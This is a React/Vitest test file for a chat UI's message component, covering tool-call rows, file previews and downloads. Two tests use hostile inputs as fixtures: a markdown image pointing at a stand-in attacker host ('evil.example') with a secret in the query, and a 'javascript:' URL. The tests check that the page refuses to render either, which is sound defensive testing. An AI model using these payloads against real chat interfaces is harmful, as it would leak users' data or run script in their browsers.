/**
 * chat-ui's MessageContent across re-renders: a tool call row must stay mounted
 * (and keep its expanded state) when the message around it changes.
 */

import MessageContentUI from "@neore/chat-ui/chat/message-content";
import type { ChatMessage } from "@neore/chat-ui/types";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { toUIMessages } from "@/lib/agent";

import { buildHostReply } from "../../../../../../backend/lunora/acp/lib/reply";

// Unit tests do not compile the Lingui macros; chat-ui's rows call `useLingui`.
vi.mock("@lingui/react/macro", () => {
    return {
        Plural: ({ other, value }: { other: string; value: number }) => other.replace("#", () => String(value)),
        Trans: ({ children }: { children: unknown }) => children,
        useLingui: () => {
            return {
                i18n: { _: (descriptor: { id: string; message?: string }) => descriptor.message ?? descriptor.id, locale: "en" },
                t: (strings: TemplateStringsArray, ...values: unknown[]) => String.raw({ raw: strings }, ...values),
            };
        },
    };
});

const LOOKUP_BUTTON = /lookup/u;
const DATA_FILE_LINK = /data\.bin/u;

const message = (text: string): ChatMessage =>
    ({
        id: "m1",
        parts: [
            { input: { query: "weather" }, output: { ok: true }, state: "output-available", toolCallId: "call-1", type: "tool-lookup" },
            { text, type: "text" },
        ],
        role: "assistant",
        status: "success",
    }) as unknown as ChatMessage;

describe("message content tool call rows", () => {
    it("keeps a tool call expanded when the message re-renders", () => {
        const { rerender } = render(<MessageContentUI message={message("first")} />);

        fireEvent.click(screen.getByRole("button", { name: LOOKUP_BUTTON }));

        expect(screen.getByRole("button", { name: LOOKUP_BUTTON }).getAttribute("aria-expanded")).toBe("true");

        rerender(<MessageContentUI message={message("first, then more")} />);

        // A fresh component type per render remounted the row and collapsed it.
        expect(screen.getByRole("button", { name: LOOKUP_BUTTON }).getAttribute("aria-expanded")).toBe("true");
    });
});

describe("message content text parts", () => {
    it("marks each text part for in-thread find, and nothing else", () => {
        const { container } = render(<MessageContentUI message={message("the answer")} />);

        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about DOM structure
        const marked = container.querySelectorAll("[data-find-text]");

        expect(marked).toHaveLength(1);
        expect(marked[0]?.textContent).toContain("the answer");
    });
});

describe("message content file previews", () => {
    it("wraps an embedded file in .message-text-fixed, so the chat text size does not resize its controls", () => {
        const withFile = {
            id: "m2",
            parts: [{ filename: "notes.bin", mediaType: "application/octet-stream", type: "file", url: "https://files.test/notes.bin" }],
            role: "user",
            status: "success",
        } as unknown as ChatMessage;

        const { container } = render(<MessageContentUI message={withFile} />);

        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about DOM structure
        expect(container.querySelector(".message-text-fixed")).not.toBeNull();
    });
});

describe("a coding agent's stored reply", () => {
    it("stays literal from the saved row through toUIMessages to the page: no remote image is loaded", () => {
        const reply = buildHostReply({
            agentKey: "claude",
            reason: "finished",
            transcript: {
                children: [],
                media: [],
                reasoning: "",
                text: "Chart ![c](out/chart.png) and a pixel ![](https://evil.example/?q=secret).",
            },
        });
        const row = { ...reply, _creationTime: 1, _id: "m1", order: 1, stepOrder: 0, threadId: "t1", tool: false, userId: "u1" };
        const [ui] = toUIMessages([row as never]);
        const { container } = render(<MessageContentUI message={ui as unknown as ChatMessage} />);

        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about what the DOM may fetch
        expect(container.querySelector("img")).toBeNull();
        expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
    });
});

describe("saving a message's files", () => {
    const withFiles = {
        id: "m3",
        parts: [
            { filename: "chart.png", mediaType: "image/png", type: "file", url: "https://api.test/agent-files/chart?sig=1" },
            { filename: "data.bin", mediaType: "application/octet-stream", type: "file", url: "https://api.test/agent-files/data?sig=1" },
        ],
        role: "assistant",
        status: "success",
    } as unknown as ChatMessage;

    /** Records each download link the save helper clicks, and answers every fetch with a small blob. */
    const recordSaves = () => {
        const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});

        vi.stubGlobal("URL", Object.assign(URL, { createObjectURL: () => "blob:https://app.test/1", revokeObjectURL: () => {} }));
        vi.stubGlobal(
            "fetch",
            vi.fn(async () => {
                return { blob: async () => new Blob(["x"], { type: "image/png" }), body: null, ok: true, status: 200 };
            }),
        );

        // Each click's `this` is the link the helper clicked.
        return () =>
            (clickSpy.mock.contexts as HTMLAnchorElement[]).map((anchor) => {
                return { download: anchor.download, href: anchor.href };
            });
    };

    afterEach(() => {
        vi.restoreAllMocks();
        vi.unstubAllGlobals();
    });

    it("offers a download for an image, named by its file", () => {
        render(<MessageContentUI message={withFiles} />);

        const link = screen.getByRole("link", { name: "Download chart.png" });

        expect(link.getAttribute("href")).toBe("https://api.test/agent-files/chart?sig=1");
        expect(link.getAttribute("download")).toBe("chart.png");
        // Shown on hover or focus, and always where nothing can hover (a touch screen).
        expect(link.className).toContain("[@media(hover:none)]:opacity-100");
    });

    it("links no download for an image value a link must not open", () => {
        const unsafe = {
            id: "m4",
            parts: [{ image: ["javascript", ":alert(document.domain)"].join(""), type: "image" }],
            role: "assistant",
            status: "success",
        } as unknown as ChatMessage;

        render(<MessageContentUI message={unsafe} />);

        expect(screen.queryByRole("link", { name: "Download image" })).toBeNull();
    });

    it("saves the image under its own name, not the storage URL's", async () => {
        const saved = recordSaves();

        render(<MessageContentUI message={withFiles} />);
        fireEvent.click(screen.getByRole("link", { name: "Download chart.png" }));

        await waitFor(() => {
            expect(saved()).toEqual([{ download: "chart.png", href: "blob:https://app.test/1" }]);
        });
    });

    it("saves a file card's file under its own name", async () => {
        const saved = recordSaves();

        render(<MessageContentUI message={withFiles} />);
        fireEvent.click(await screen.findByRole("link", { name: DATA_FILE_LINK }));

        await waitFor(() => {
            expect(saved()).toEqual([{ download: "data.bin", href: "blob:https://app.test/1" }]);
        });
    });
});
